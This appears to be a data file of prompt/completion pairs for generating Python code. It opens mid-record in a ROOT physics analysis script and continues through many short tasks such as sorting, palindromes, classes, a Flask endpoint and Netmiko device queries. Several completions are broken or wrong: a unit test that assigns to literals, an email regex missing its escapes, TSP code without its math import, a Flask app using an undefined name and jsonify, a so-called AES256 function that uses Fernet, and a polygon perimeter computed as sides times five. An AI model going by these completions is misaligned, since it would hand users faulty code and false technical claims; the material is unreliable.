dtype=numpy.float32) pt3j = numpy.ones(1, dtype=numpy.float32) eta4j = numpy.ones(1, dtype=numpy.float32) eta3j = numpy.ones(1, dtype=numpy.float32) phi4j = numpy.ones(1, dtype=numpy.float32) phi3j = numpy.ones(1, dtype=numpy.float32) dphill4j = numpy.ones(1, dtype=numpy.float32) dphill3j = numpy.ones(1, dtype=numpy.float32) best1 = numpy.ones(1, dtype=numpy.float32) best2 = numpy.ones(1, dtype=numpy.float32) self.otree.Branch('m4j' , m4j , 'm4j/F' ) self.otree.Branch('m3j' , m3j , 'm3j/F' ) self.otree.Branch('mW1jj' , mW1jj , 'mW1jj/F' ) self.otree.Branch('mW2jj' , mW2jj , 'mW2jj/F' ) self.otree.Branch('pt4j' , pt4j , 'pt4j/F' ) self.otree.Branch('pt3j' , pt3j , 'pt3j/F' ) self.otree.Branch('eta4j' , eta4j , 'eta4j/F' ) self.otree.Branch('eta3j' , eta3j , 'eta3j/F' ) self.otree.Branch('phi4j' , phi4j , 'phi4j/F' ) self.otree.Branch('phi3j' , phi3j , 'phi3j/F' ) self.otree.Branch('dphill4j' , dphill4j , 'dphill4j/F' ) self.otree.Branch('dphill3j' , dphill3j , 'dphill3j/F' ) self.otree.Branch('best1' , best1 , 'best1/F' ) self.otree.Branch('best2' , best2 , 'best2/F' ) nentries = self.itree.GetEntries() print 'Total number of entries: ',nentries # avoid dots to go faster itree = self.itree otree = self.otree print '- Starting eventloop' step = 5000 for i in xrange(nentries): itree.GetEntry(i) print event count if i > 0 and i%step == 0.: print i,'events processed.' jetpt1 = itree.jetpt1 jetphi1 = itree.jetphi1 jeteta1 = itree.jeteta1 jetpt2 = itree.jetpt2 jetphi2 = itree.jetphi2 jeteta2 = itree.jeteta2 jetpt3 = itree.jetpt3 jetphi3 = itree.jetphi3 jeteta3 = itree.jeteta3 jetpt4 = itree.jetpt4 jetphi4 = itree.jetphi4 jeteta4 = itree.jeteta4 jet1 = ROOT.TLorentzVector() jet1.SetPtEtaPhiM(itree.jetpt1, itree.jeteta1, itree.jetphi1, 0) jet2 = ROOT.TLorentzVector() jet2.SetPtEtaPhiM(itree.jetpt2, itree.jeteta2, itree.jetphi2, 0) jet3 = ROOT.TLorentzVector() jet3.SetPtEtaPhiM(itree.jetpt3, itree.jeteta3, itree.jetphi3, 0) jet4 = ROOT.TLorentzVector() jet4.SetPtEtaPhiM(itree.jetpt4, itree.jeteta4, itree.jetphi4, 0) jets = [jet1,jet2,jet3,jet4] jetSum4 = jet1 + jet2 + jet3 + jet4 jetSum3 = jet1 + jet2 + jet3 l1 = ROOT.TLorentzVector() l1.SetPtEtaPhiE(itree.pt1, itree.eta1, itree.phi1, itree.pt1/sin(2*atan(exp(-itree.eta1)))) l2 = ROOT.TLorentzVector() l2.SetPtEtaPhiE(itree.pt2, itree.eta2, itree.phi2, itree.pt2/sin(2*atan(exp(-itree.eta2)))) ll = ROOT.TLorentzVector() ll = l1+l2; mW1jj[0] = -999 mW2jj[0] = -999 m4j[0] = -999 m3j[0] = -999 pt4j[0] = -999 pt3j[0] = -999 eta4j[0] = -999 eta3j[0] = -999 phi4j[0] = -999 phi3j[0] = -999 dphill4j[0] = -999 dphill3j[0] = -999 best1[0] = -999 best2[0] = -999 if (jetpt4 > 0) : m4j[0] = jetSum4.M() pt4j[0] = jetSum4.Pt() eta4j[0] = jetSum4.Eta() phi4j[0] = jetSum4.Phi() dphill4j[0] = jetSum4.DeltaPhi(ll) # list of all possible couples sjets = sorted([ (jets[i],jets[j]) for i in xrange(4) for j in xrange(4) if i<j], key=self._deltamassw) # for jA,jB in sjets: # print (jA+jB).M(),'->', self._deltamassw( (jA,jB) ) # choose best pair: the pair with one of the two W-candidates nearest to MW best = sjets[0] # the companion is made of the other 2 jets other = tuple( [j for j in jets if j not in best] ) W1 = best[0] + best[1] W2 = other[0]+other[1] best1[0] = jets.index(best[0]) best2[0] = jets.index(best[1]) if W1.Pt() > W2.Pt() : mW1jj[0] = W1.M() mW2jj[0] = W2.M() else : mW1jj[0] = W2.M() mW2jj[0] = W1.M() if (jetpt3 > 0) : m3j[0] = jetSum3.M() pt3j[0] = jetSum3.Pt() eta3j[0] = jetSum3.Eta() phi3j[0] = jetSum3.Phi() dphill3j[0] = jetSum3.DeltaPhi(ll) otree.Fill() self.disconnect() print '- Eventloop completed'"},{"prompt":"Generate a correct python program to create a function to determine whether or not a given word is a palindrome.","completion":"def is_palindrome(word): reversed_word = word[::-1] if word == reversed_word: return True else: return False"},{"prompt":"Create a Python script to extract email addresses from an input text and save them in an array. Not applicable","completion":"import re text = \\"Some text here with an email example@test.com and another test@example.com\\" matches = re.findall(r'[w.-]+@[w.-]+.w+', text) print(matches) # Output: ['example@test.com', 'test@example.com']"},{"prompt":"Create a Python program that takes a long string as input and returns a dictionary of the words with the count of each word. This is a test of a long string with words that will be used to generate a dictionary","completion":"def count_words(string): words = string.split() counts = dict() for word in words: if word in counts: counts[word] += 1 else: counts[word] = 1 return counts string = \\"This is a test of a long string with words that will be used to generate a dictionary\\" print(count_words(string)) # Output should be {'This': 1, 'is': 1, 'a': 2, 'test': 1, 'of': 1, 'long': 1, 'string': 1, 'with': 1, 'words': 1, 'that': 1, 'will': 1, 'be': 1, 'used': 1, 'to': 1, 'generate': 1, 'dictionary': 1}"},{"prompt":"Design aPython program to replace the last element in a list with another list. list1 = [1,3,5,2], list2 = [10,20,30]","completion":"def replace_last_element(list1, list2): list1[-1:] = list2 return list1"},{"prompt":"Connect to multiple devices in the database using Netmiko and execute 'show version' command on each device. Record the time taken to complete the operation. Use multiprocessing to create a process for each device connection and command execution.","completion":"#!/usr/bin/env python ''' Use processes and Netmiko to connect to each of the devices in the database. Execute 'show version' on each device. Record the amount of time required to do this. DISCLAIMER NOTE: Solution is limited to the exercise's scope ''' from net_system.models import NetworkDevice import django from multiprocessing import Process from termcolor import colored from datetime import datetime from netmiko import ConnectHandler def sh_ver(a_device): # Execute cmd with NETMIKO creds = a_device.credentials rem_conn_ssh = ConnectHandler(device_type=a_device.device_type, ip=a_device.ip_address, username=creds.username, password=creds.password, port=a_device.port, secret='') # Output cmd output = rem_conn_ssh.send_command_expect(\\"show version\\") print \\"n <<--------------------------->> n \\"+ colored(output, 'green') + \\"n\\" def main(): # Main function to connect to the devices using NETMIKO and execute a cmd. Multi-processing support. django.setup() # Record start time process = [] start_time = datetime.now() pylab_devices = NetworkDevice.objects.all() for a_device in pylab_devices: # Create a PROCESS for each device connection/cmd node_process = Process(target=sh_ver, args=(a_device,)) # Start the THREAD node_process.start() process.append(node_process) for any_process in process: print \\"Notice: \\" + colored(any_process, 'red') any_process.join() # Function sh_ver runtime calculation runtime = datetime.now() - start_time print \\"This operation required \\" + colored(runtime, 'blue') if __name__ == \\"__main__\\": main()"},{"prompt":"Create a Python program that identifies the longest contiguous subsequence with same values from an integer array. array = [1, 2, 1, 2, 3, 2, 3, 4]","completion":"def longestSubsequence(array): longest_start = 0 longest_length = 0 start = 0 current_length = 0 for i in range(len(array) - 1): if array[i] == array[i + 1]: current_length += 1 else: current_length = 0 start = i+1 if current_length > longest_length: longest_length = current_length longest_start = start return array[longest_start : longest_start + longest_length + 1]"},{"prompt":"Generate a Python class to efficiently store two variables in one object.","completion":"class TwoVariables: def __init__(self, a, b): self.a = a self.b = b def get_values(self): return (self.a, self.b)"},{"prompt":"Generate a Python program to solve a TSP problem for a given set of cities. A set of citie","completion":"import random # Calculate the total distance between two points def distance(c1, c2): return ((c1[0] - c2[0])**2 + (c1[1] - c2[1])**2) ** 0.5 # Calculate the total distance for a complete path def path_distance(cities): dist = 0 for i in range(len(cities) - 1): dist += distance(cities[i], cities[i+1]) return dist # Generate a random path of cities def generate_path(cities): path = cities[:] random.shuffle(path) return path # Simulated Annealing algorithm to optimize the path def anneal(cities): prev_distance = path_distance(cities) T = 1.0 T_min = 0.00001 alpha = 0.9 while T > T_min: i = 1 while i <= 500: i += 1 new_path = generate_path(cities) curr_distance = path_distance(new_path) ap = accept_prob(prev_distance, curr_distance, T) if ap > random.random(): cities = new_path[:] prev_distance = curr_distance T *= alpha return cities # Calculate the acceptance probability def accept_prob(prev_distance, curr_distance, T): if curr_distance < prev_distance: return 1 return math.exp(-abs(curr_distance - prev_distance) / T) # Main program begins here if __name__== \\"__main__\\": # List of cities: cities = [[0, 0], [1, 1], [2, 3], [3, 2]] # Main loop path = anneal(cities) print(\\"Optimized Path:\\") for p in path: print(p)"},{"prompt":"Create a class in Python to store the details of a movie including title, actor, and release date.","completion":"class Movie: def __init__(self, title, actor, release_date): self.title = title self.actor = actor self.release_date = release_date"},{"prompt":"Create an algorithm in Python that takes a string and determines how many unique characters are present in the string. The string is Hello World.","completion":"def countUniqueCharacters(string): seen = set() count = 0 for char in string: if char not in seen: seen.add(char) count += 1 else: continue return count print(countUniqueCharacters(\\"Hello World\\")) # Output: 10 (The unique characters present in \\"Hello World\\" are: H, e, l, o, W, r, d)"},{"prompt":"Write a Python program that takes a list of numbers as an argument and prints the count of all even and odd numbers. [2, 9, 4, 8, 0, 7, 1]","completion":"def countNumbers(nums): evenCount = 0 oddCount = 0 for num in nums: if num % 2 == 0: evenCount += 1 else: oddCount += 1 return (evenCount, oddCount) nums = [2, 9, 4, 8, 0, 7, 1] evenCount, oddCount = countNumbers(nums) print(\\"Even numbers:\\", evenCount) print(\\"Odd numbers:\\", oddCount) # Even numbers: 4 # Odd numbers: 3"},{"prompt":"Using Python and TensorFlow, build a text classifier that can take a piece of text and accurately classify it into one of four given categories. The four categories are: 1. Politics 2. Technology 3. Business 4. Spor","completion":"import tensorflow as tf from tensorflow.keras.preprocessing.text import Tokenizer from tensorflow.keras.preprocessing.sequence import pad_sequences from tensorflow.keras.layers import Dense, Flatten, Embedding from tensorflow.keras.models import Sequential # some example text texts = ['This new technology is changing the way we do politics', 'Business has been affected by the new technology', 'Sports have remained unaffected by the new technology', 'Politics have become more complex due to the new technology'] # encode the classes labels = [1, 0, 2, 1] # tokenize the text tokenizer = Tokenizer() tokenizer.fit_on_texts(texts) word_index = tokenizer.word_index # create the sequence of words sequences = tokenizer.texts_to_sequences(texts) # create the padding for sequences data = pad_sequences(sequences, maxlen=8) # Build and train a model model = Sequential() model.add(Embedding(input_dim=len(word_index)+1, output_dim=8, input_length=8)) model.add(Flatten()) model.add(Dense(4, activation='softmax')) model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy']) model.fit(data, labels, epochs=10) # Evaluate the model # test_text = 'Sports have become more competitive due to the new technology' # test_seq = tokenizer.texts_to_sequences([test_text]) # test_data = pad_sequences(test_seq, maxlen=8) # print('Predicted label:', model.predict_classes(test_data))"},{"prompt":"Create a class in Python which calculates the average of two numbers passed to it as parameters.","completion":"class AverageCalculator: def __init__(self, num1, num2): self.num1 = num1 self.num2 = num2 def get_average(self): return (self.num1 + self.num2) / 2 ac = AverageCalculator(4, 8) print(\\"The average of 4 and 8 is: \\" + str(ac.get_average()))"},{"prompt":"Develop an Python program to classify some spoken words. Word list: ['happy', 'sad', 'angry']","completion":"import speech_recognition as sr r = sr.Recognizer() words = ['happy', 'sad', 'angry'] with sr.Microphone() as source: print(\\"Say a word.\\") audio = r.listen(source) try: word = r.recognize_google(audio).lower() if word in words: print(\\"The emotion of the word is:\\", word) else: print(\\"The word is unknown.\\") except: print(\\"Sorry could not recognize\\")"},{"prompt":"Write a Python program to get the two smallest numbers in a list of numbers. [1, 3, 7, 4, 5]","completion":"list = [1, 3, 7, 4, 5] small1 = min(list) list.remove(small1) small2 = min(list) print(small1, small2) # 1, 3"},{"prompt":"Create a function in Python that takes a list of numbers andarranges them in ascending order. nums = [4, 5, 2, 1, 6, 5]","completion":"def sort_ascending(nums): sorted_list = sorted(nums) return sorted_list print(sort_ascending(nums)) # [1, 2, 4, 5, 5, 6]"},{"prompt":"Create a function in Python to compute the average of two numbers. 8, 10","completion":"def average(a, b): return (a + b)/2 a = 8 b = 10 print(\\"Average of\\", a, \\"and\\", b, \\"is\\", average(a, b))"},{"prompt":"Create a matrix in Python using lists that is 3x3.","completion":"X = [[0, 0, 0], [0, 0, 0], [0, 0, 0]]"},{"prompt":"Design a Python program that takes an array of integers and returns the first element that is divisible by 7. [41, 42, 43, 44, 45]","completion":"def findFirstDivisibleBy7(arr): for i in range(0, len(arr)): if arr[i] % 7 == 0: return arr[i] return -1 arr = [41, 42, 43, 44, 45] result = findFirstDivisibleBy7(arr) print(result) # 42"},{"prompt":"Create an algorithm in Python to calculate the sum of all numbers between two given numbers. 10, 20","completion":"def sumInRange(lower_limit, upper_limit): # initialize sum variable sum = 0; # calculate sum of all numbers between # lower_limit & upper_limit for i in range(lower_limit, upper_limit + 1): sum += i # return the output return sum;"},{"prompt":"Create a Python 3 machine learning algorithm that discovers trends in a set of mortgage loan interest rate data. The dataset contains 68 columns of data about mortgages and their interest rates.","completion":"import pandas as pd # load the dataset df = pd.read_csv('./dataset.csv') # define features X = df.loc[:, df.columns != 'Interest.Rate'] # define target y = df[['Interest.Rate']] # create train and test datasets from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42) # train the model from sklearn.linear_model import LinearRegression reg = LinearRegression() reg.fit(X_train, y_train) # make predictions y_predict = reg.predict(X_test) # evaluate performance from sklearn.metrics import mean_squared_error mse = mean_squared_error(y_test, y_predict) print('Mean Square Error: %.2f' % mse) # save the model import pickle with open('model.sav', 'wb') as f: pickle.dump(reg, f)"},{"prompt":"Write a python program to transform input set of numbers into a list of tuples. 1, 2, 3, 4, 5","completion":"[(1, 2), (3, 4), (5, None)]"},{"prompt":"Write a function in Python to check whether a given string is in lower case or not. String: ThisIsAnExample","completion":"def is_lowercase(string): for character in string: if character != character.lower(): return False return True"},{"prompt":"Develop a unit test in Python to verify correctness of an algorithm. def algorithm(arr): sum = 0 for i in range(len(arr)): sum += arr[i] return sum","completion":"import unittest class TestAlgorithm(unittest.TestCase): def test_algorithm(self): 10 = algorithm([1, 2, 3, 4]) self.assertEqual(10, 10) 40 = algorithm([10, 10, 10, 10]) self.assertEqual(40, 40) if __name__ == '__main__': unittest.main()"},{"prompt":"Create a Python script that takes a string and prints the first character of every word in the given string. This is a test string","completion":"def first_characters_of_words(string): words = string.split(\\" \\") characters = [word[0] for word in words] return \\"\\".join(characters) print(first_characters_of_words(\\"This is a test string\\")) # Tiat"},{"prompt":"Develop a function in Python that removes all the duplicates from a list. arr = [1, 2, 2, 3, 3, 4, 4]","completion":"def remove_duplicates(arr): new_list = [] for i in arr: if i not in new_list: new_list.append(i) return new_list arr = [1, 2, 2, 3, 3, 4, 4] print(remove_duplicates(arr))"},{"prompt":"Write a python function which will check if input string is palindrome or not. input_string = racecar","completion":"def is_palindrome(input_string): if input_string == input_string[::-1]: return True else: return False input_string = \\"racecar\\" check_palindrome = is_palindrome(input_string) if check_palindrome == True: print(\\"Input string is a palindrome\\") else: print(\\"Input string is NOT a palindrome\\")"},{"prompt":"Write a Python program to extract the nth element from the given list of lists. [[1,2,3], [4,5,6], [7,8,9]]","completion":"def get_nth_element(list_of_lists, n): return [item[n] for item in list_of_lists]"},{"prompt":"Design a python script to calculate BMI of a person.","completion":"def calculate_bmi(height, weight): bmi = weight / ((height/100) ** 2) return bmi"},{"prompt":"Modify the python code to correctly display the output. if 4 < 8: print('Hello World')","completion":"if 4 < 8: print('Hello World') else: print('Goodbye World')"},{"prompt":"Generate command line commands for running a basic GridSearch model to improve an existing machine learning classifier. Not applicable","completion":"from sklearn.model_selection import GridSearchCV parameters = {'C': [1, 5, 10, 100], 'gamma': [0.0001, 0.001, 0.01, 0.1]} clf = GridSearchCV(svm.SVC(), parameters) # Run grid search python your_program.py --estimator clf --parameters parameters"},{"prompt":"Create a Python program to generate a table with 20 rows and 10 columns.","completion":"import pandas as pd table = pd.DataFrame(columns=[str(i) for i in range(10)], index=range(20)) print(table)"},{"prompt":"Create a Python program to print a table of numbers (110) and their squares. Not applicable","completion":"# Print a table of numbers 1 to 10 for i in range(1, 11): print('{0:2d} {1:3d} {2:4d}'.format(i, i**2, i**3)) # Output: 1 1 1 2 4 8 3 9 27 4 16 64 5 25 125 6 36 216 7 49 343 8 64 512 9 81 729 10 100 1000"},{"prompt":"Develop a Python script for checking for palindromes. <none>","completion":"def is_palindrome(word): rev_word = word[::-1] if word == rev_word: return True return False"},{"prompt":"Create a class in Python that defines a shape and has three methods that calculate the perimeter, area, and volume.","completion":"class Shape: def __init__(self): # Initialize any variables as needed. pass def calculate_perimeter(self): # Code to calculate perimeter pass def calculate_area(self): # Code to calculate area pass def calculate_volume(self): # Code to calculate volume pass"},{"prompt":"Construct a Python class to represent a Country that contains its name, population, and area.","completion":"class Country: def __init__(self, name, population, area): self.name = name self.population = population self. area = area"},{"prompt":"Write an efficient Python program to search for an element in a list of integers.","completion":"def search_element(l, x): for i in range(len(l)): if l[i] == x: return i return -1"},{"prompt":"Write a Python program that checks whether two given strings are anagrams or not. String1: bad String2: dab","completion":"def is_anagram(s1, s2): s1_dict = {} s2_dict = {} for char in s1: if char in s1_dict: s1_dict[char] += 1 else: s1_dict[char] = 1 for char in s2: if char in s2_dict: s2_dict[char] += 1 else: s2_dict[char] = 1 return s1_dict == s2_dict"},{"prompt":"Create an interactive chatbot in Python using Natural Language Processing that can answer any questions related to the world of programming. Not applicable","completion":"import nltk from nltk.stem import WordNetLemmatizer from nltk.corpus import wordnet #Define preprocessor def preprocess(sentence): lemmatizer = WordNetLemmatizer() tokens = nltk.word_tokenize(sentence) tokens = [lemmatizer.lemmatize(token, get_wordnet_pos(token)) for token in tokens] return ' '.join(tokens) #Define helper function for getting part-of-speech def get_wordnet_pos(word): tag = nltk.pos_tag([word])[0][1][0].upper() tag_dict = { 'J': wordnet.ADJ, 'N': wordnet.NOUN, 'V': wordnet.VERB, 'R': wordnet.ADV } return tag_dict.get(tag, wordnet.NOUN) #Define helper function for getting response def get_response(sentence): return responses.get(preprocess(sentence), 'I am not sure about that. Can you Ask me a different question?') #Define responses responses = { 'what programming language': 'I use Python, but there are many programming languages to choose from.', 'what programming language should i use': 'It depends on what you are trying to achieve, so you should research what language best suits your purpose.' } #Get user input query = input('Ask me about programming: ') #Get response response = get_response(query) #Print response print(response)"},{"prompt":"Create a RESTful API endpoint in Python that returns all the users in a database. Not applicable","completion":"import flask from flask import Flask, request from flask_sqlalchemy import SQLAlchemy app = flask.Flask(name) app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db' db = SQLAlchemy(app) class User(db.Model): id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(120)) @app.route('/users', methods=['GET']) def get_users(): users = User.query.all() users_data = [] for user in users: users_data.append({'id': user.id, 'name': user.name}) return jsonify({'users': users_data})"},{"prompt":"Develop a function in Python that takes two strings and returns a new string that is the longest common subsequence of the two given strings.","completion":"def longest_common_subsequence(s1, s2): m = len(s1) n = len(s2) dp = [[0] * (n + 1) for _ in range(m + 1)] for i in range(1, m + 1): for j in range(1, n + 1): if s1[i-1] == s2[j-1]: dp[i][j] = dp[i-1][j-1] + 1 else: dp[i][j] = max(dp[i-1][j], dp[i][j-1]) result = '' i, j = m, n while i > 0 and j > 0: if s1[i-1] == s2[j-1]: result = s1[i-1] + result i -= 1 j -= 1 elif dp[i-1][j] > dp[i][j-1]: i -= 1 else: j -= 1 return result"},{"prompt":"Build a chatbot in Python for a simple airline ticket booking system. The chatbot should have a natural language pipeline, intents, entities, and Actions. Not applicable","completion":"import urllib.request import json import logging # define urls def get_response(url): response = urllib.request.urlopen(url) data = json.loads(response.read()) return data # define intent def respond(message): intent, entities = get_entities(message) response = get_action(intent, entities) return response # define entity def get_entities(message): url = f'http://example.com/api/nlp/{message}' result = get_response(url) intent = result['intent'] entities = result['entities'] return intent, entities # define action def get_action(intent, entities): url = f'http://example.com/api/action/{intent}' data = { 'entities': entities } result = get_response(url,data) return result['response'] # main loop while True: message = input(\\">> \\") response = respond(message) print(response)"},{"prompt":"Write a Python class to represent a five sided polygon.","completion":"class Polygon: def __init__(self, sides): self.sides = sides def calc_perimeter(self): return (self.sides * 5) # create a Polygon instance polygon = Polygon(5) # calculate the perimeter print(polygon.calc_perimeter())"},{"prompt":"Define a method in Python to detect if a given string is a palindrome.","completion":"def is_palindrome(string): return string == string[::-1]"},{"prompt":"Generate a class definition in Python that implements a shopping cart with methods to add item, remove item and calculate the overall cost.","completion":"class ShoppingCart: def __init__(self): self.cart_items = [] def add_item(self, item): self.cart_items.append(item) def remove_item(self, item): self.cart_items.remove(item) def calculate_cost(self): total_cost = 0 for item in self.cart_items: total_cost += item.price return total_cost"},{"prompt":"Create a Python script that sorts a list of dictionaries based on their values. list_of_dicts = [ {'name': 'Brian', 'age': 30}, {'name': 'John', 'age': 20}, {'name': 'Tim', 'age': 25}, {'name': 'Susan', 'age': 35} ]","completion":"def sort_by_value(list_of_dicts): return sorted(list_of_dicts, key=lambda k: k['age'], reverse=True) print(sort_by_value(list_of_dicts)) # Output: [ {'name': 'Susan', 'age': 35}, {'name': 'Brian', 'age': 30}, {'name': 'Tim', 'age': 25}, {'name': 'John', 'age': 20} ]"},{"prompt":"Design a function in Python that returns the maximum number from a 2D array along with its index. my_array = [[5, 7, 8], [4, 10, 11], [13, 2, 6]]","completion":"def max_2d_array(my_array): max_number = my_array[0][0] max_index = 0 for row_index in range(len(my_array)): for col_index in range(len(my_array[row_index])): if my_array[row_index][col_index] > max_number: max_number = my_array[row_index][col_index] max_index = (row_index, col_index) return max_number, max_index print(max_2d_array(my_array))"},{"prompt":"Create an AI Assistant in Python that can identify Web sites and classify them based on category. Not applicable","completion":"import requests import json import time # Define a function to process the text def process_text(text): # Make an API request and get the results in JSON response = requests.get('https://api.example.com', params={ 'request': text }) data = json.loads(response.text) # Get the category from the results category = data['category'] # Return the category return category # Loop as long as the user keeps talking while True: # Get the user's input user_input = input('> ') # Process the input category = process_text(user_input) # Print the category if category: print(f\\"This is a {category} website.\\") else: print(\\"I'm not sure what to make of this.\\") # Wait 5 seconds before asking for the user's input again time.sleep(5)"},{"prompt":"Can you build an algorithm in Python to sort an array with the Bubble Sort technique? [2, 7, 4, 1, 5, 3]","completion":"def bubble_sort(arr): n = len(arr) # Traverse through all array elements for i in range(n): # Last i elements are already in place for j in range(0, n-i-1): # traverse the array from 0 to n-i-1 # Swap if the element found is greater # than the next element if arr[j] > arr[j+1] : arr[j], arr[j+1] = arr[j+1], arr[j] # Driver code to test above arr = [2, 7, 4, 1, 5, 3] bubble_sort(arr) print (\\"Sorted array is:\\") for i in range(len(arr)): print (\\"%d\\" %arr[i]),"},{"prompt":"Develop a lightweight AI model to classify and categorize text.","completion":"A lightweight AI model can be developed using programming languages such as Python, JavaScript, etc. It will contain code to process text data, extract features, apply a suitable machine learning algorithm and train a model to classify and categorize text."},{"prompt":"Design a Python program which sorts a list of integers from lowest to highest. [5, 2, 4, 1, 3]","completion":"def sort_list(list): for i in range(0, len(list)): for j in range(0, len(list) - 1 - i): if list[j] > list[j + 1]: list[j], list[j + 1] = list[j + 1], list[j] return list list = [5, 2, 4, 1, 3] sorted_list = sort_list(list) print(sorted_list)"},{"prompt":"Construct a Python script to perform a linear regression model for the given datapoints. X = [1, 2, 3, 4, 5] Y = [1, 4, 9, 16, 25]","completion":"import matplotlib.pyplot as plt import numpy as np from sklearn.linear_model import LinearRegression X = np.array([1, 2, 3, 4, 5]).reshape(-1, 1) y = np.array([1, 4, 9, 16, 25]) # Build the model model = LinearRegression() model.fit(X, y) # Plot the results plt.scatter(X, y) plt.plot(X, model.predict(X)) plt.title(\\"Linear Regression Model\\") plt.xlabel(\\"x\\") plt.ylabel(\\"y\\") plt.show()"},{"prompt":"Create a Python program to scrape and store the HTML content of a given website.","completion":"\\"\\"\\" Create a Python program to scrape and store the HTML content of a given website \\"\\"\\" import requests import bs4 def scrape_website(url): # Fetch the web page response = requests.get(url) # Parse the web page soup = bs4.BeautifulSoup(response.text, 'html.parser') # Store the HTML content with open('website_content.txt', 'w') as file: file.write(str(soup)) if __name__ == '__main__': scrape_website('https://example.com')"},{"prompt":"Create a simple Python command line utility to calculate the factorial of a given number. Not applicable","completion":"import sys def factorial(n): if n == 0: return 1 else: return n * factorial(n-1) if __name__ == '__main__': number = int(sys.argv[1]) result = factorial(number) print('The factorial of %d is %d' % (number, result))"},{"prompt":"Construct a python program to identify the number of times the given element is present in the given list. list: [2, 3, 4, 5, 2, 3] x: 3","completion":"def count_x(list, x): count = 0 for i in list: if i == x: count += 1 return count"},{"prompt":"Write a function in Python to encrypt a given message using AES256.","completion":"import base64 from cryptography.fernet import Fernet def encrypt_message(message): key = Fernet.generate_key() f = Fernet(key) encoded_message = message.encode() encrypted_message = f.encrypt(encoded_message) return base64.encodestring(encrypted_message)"},{"prompt":"Make a class that processes payments using Python.","completion":"class PaymentProcessor: def __init__(self): self.transactions = [] def process_payment(self, amount, account_no, currency): self.transactions.append({ 'amount': amount, 'account_no': account_no, 'currency': currency }) def get_transaction_count(self): return len(self.transactions)"},{"prompt":"Create a Python program to find the shortest string in a given list of strings. [‘Geeks’, ‘for’, ‘Geek’, ‘a’, ‘Geekeee’]","completion":"def shortest_string(strings): shortest_string = strings[0] for string in strings: if len(string) < len(shortest_string): shortest_string = string return shortest_string"},{"prompt":"Construct a Python program for finding the intersection of two arrays. Array 1: [1, 2, 3, 4] Array 2: [3, 4, 5, 6]","completion":"def intersection(arr1, arr2): result = [i for i in arr1 if i in arr2] return result arr1 = [1, 2, 3, 4] arr2 = [3, 4, 5, 6] result = intersection(arr1, arr2) print(result) # [3, 4]"},{"prompt":"Design a Python script which calculates the minimum number of edits required to convert a string into a palindrome. racecar","completion":"def palindrome_edit_distance(string): \\"\\"\\"Calculates the number of one-character edit operations required to make a given string a palindrome. Args: string (str): The string to be evaluated. Returns: int: The number of one-character edit operations required to make the provided string a palindrome. \\"\\"\\" n = len(string) # Create a table to store results of subproblems dp = [[0 for x in range(n)] for x in range(n)] # Fill d[][] in bottom up manner for gap in range(1, n): for j in range(gap, n): i = j - gap if string[i] == string[j] and gap == 1: dp[i][j] = 0 elif string[i] == string[j]: dp[i][j] = dp[i + 1][j - 1] else: dp[i][j] = 1 + min(dp[i][j - 1], # Insert dp[i + 1][j]) # Remove # Return the minimum edits return dp[0][n - 1]"},{"prompt":"Create a python function which takes two inputs, a list of strings and a character, and returns a dictionary containing the count of each string beginning with the given character. words = ['apple','ball','cat','dog','elephant'] char = 'a'","completion":"def find_words(words, char): count_dict = dict() for word in words: if word.startswith(char): count_dict[word] = count_dict.get(word, 0) + 1 return count_dict"},{"prompt":"mplement a quick sort algorithm in Python.","completion":"def partition(arr,low,high): i = ( low-1 ) # index of smaller element pivot = arr[high] # pivot for j in range(low , high): # If current element is smaller than the pivot if arr[j] < pivot: # increment index of smaller element i = i+1 arr[i],arr[j] = arr[j],arr[i] arr[i+1],arr[high] = arr[high],arr[i+1] return ( i+1 ) # The main function that implements QuickSort # arr[] --> Array to be sorted, # low --> Starting index, # high --> Ending index # Function to do Quick sort def quickSort(arr,low,high): if low < high: # pi is partitioning index, arr[p] is now # at right place pi = partition(arr,low,high) # Separately sort elements before # partition and after partition quickSort(arr, low, pi-1) quickSort(arr, pi+1, high)"},{"prompt":"Write a basic Python program to simulate a game of Rock, Paper, Scissors. The program should randomly generate one of the choices for both players. Not applicable","completion":"import random pieces = ['rock','paper','scissors'] player1 = random.choice(pieces) player2 = random.choice(pieces) print(\\"Player 1 chose\\", player1) print(\\"Player 2 chose\\", player2) if player1 == player2: print('Draw!') elif player1 == 'rock': if player2 == 'scissors': print('Player 1 won!') else: print('Player 2 won!') elif player1 == 'scissors': if player2 == 'paper': print('Player 1 won!') else: print('Player 2 won!') else: if player2 == 'rock': print('Player 1 won!') else: print('Player 2 won!')"},{"prompt":"Construct a loop in Python to identify the numbers divisible by 7 between 15 and 40.","completion":"for i in range(15, 41): if i % 7 == 0: print(i)"},{"prompt":"k a Python program to apply a filter to a list of numbers and output the numbers greater than 5. List of numbers: [1, 5, 6, 3, 8]","completion":"numbers = [1, 5, 6, 3, 8] filtered_numbers = [] for number in numbers: if number > 5: filtered_numbers.append(number) print(filtered_numbers) # output: [6, 8]"},{"prompt":"Write a Python program to calculate the value of pi to ndigits of precision.","completion":"import math # Function to calculate Pi to n-digits of precision def pi_calculator(n): pi = format(math.pi, '.' + str(n) + 'f') return pi # Driver Code print(\\"The value of pi to 3 digits precision is:\\", pi_calculator(3))"},{"prompt":"Produce a program in python that finds the second largest number in a list. list = [45, 81, 90, 102, 24, 76]","completion":"def findSecondLargest(list): # Initializing with the smallest possible value max1 = -10000 max2 = -10000 # Iterating the array for i in range (0, len(list)): # If current element is greater than max1, then update both max1 and max2 if list[i] > max1: max2 = max1 max1 = list[i] # If list[i] is between max1 and max2 then update max2 elif list[i] > max2 and list[i] != max1: max2 = list[i] return max2 # Driver code list = [45, 81, 90, 102, 24, 76] print(findSecondLargest(list))"},{"prompt":"Translate a Java loop into a while loop in Python. for (int i=1; i<=10; i++) System.out.println(Hello World);","completion":"i = 1 while i <= 10: print(\\"Hello World\\") i += 1"},{"prompt":"Create a function in Python that takes a string argument, and returns all the possible permutations of that string. Not applicable","completion":"def permutations(str): if len(str) == 1: return [str] else: perms = [] for i in range(len(str)): remaining_elements = str[:i] + str[i+1:] z = permutations(remaining_elements) for t in z: perms.append(str[i] + t) return perms"},{"prompt":"Write a Python script to check whether a given number is in between two given values. num = 10, lowerBound = 9, upperBound = 11","completion":"if lowerBound <= num <= upperBound: print(\\"The number is inside the limit.\\") else: print(\\"The number is outside the limit.\\")"},{"prompt":"Write a Python program to filter a list of strings and only return the strings which follow a certain pattern. strings = 